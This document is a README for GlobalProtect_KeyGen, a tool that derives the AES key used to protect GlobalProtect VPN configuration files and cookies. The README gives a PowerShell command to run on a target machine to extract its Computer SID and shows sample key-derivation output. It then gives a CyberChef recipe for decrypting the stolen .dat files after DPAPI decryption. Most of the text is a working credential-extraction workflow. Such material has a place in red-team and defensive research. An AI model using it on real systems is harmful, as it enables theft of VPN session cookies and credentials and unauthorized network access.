# GlobalProtect_KeyGen

Tool for generating encryption key to decrypt offline GlobalProtect VPN configuration and cookies using the Computer SID.

## Usage

Obtain Computer SID of target (execute on target system)
```
((get-wmiobject -query "Select * from Win32_UserAccount Where LocalAccount = TRUE").SID -replace "\d+$","" -replace ".$")[0]
```

Run offline to obtain encryption key
```
> GlobalProtect_KeyGen.exe
Usage: GlobalProtect_KeyGen.exe Computer_SID_VALUE
```

```
> GlobalProtect_KeyGen.exe S-1-5-21-3853142505-1760735370-2458319090
[*] Deriving AES key from computer SID
        [*] Computer SID : S-1-5-21-3853142505-1760735370-2458319090
        [*] Computer SID (Hex) : 010400000000000515000000E949AAE58AB0F268F2F88692
        [*] Derived AES Key: FFD40E0D6894B0582E3AA0F2899F9FBEFFD40E0D6894B0582E3AA0F2899F9FBE
```

## Decrypt .dat files (after DPAPI decryption -> [dpapi.py](https://github.com/fortra/impacket/blob/master/examples/dpapi.py)) using CyberChef
https://gchq.github.io/CyberChef/#recipe=AES_Decrypt(%7B'option':'Hex','string':'FFD40E0D6894B0582E3AA0F2899F9FBEFFD40E0D6894B0582E3AA0F2899F9FBE'%7D,%7B'option':'Hex','string':'0000000000000000'%7D,'CBC','Raw','Hex',%7B'option':'Hex','string':''%7D)

## Original Source Code
https://github.com/rotarydrone/GlobalUnProtect
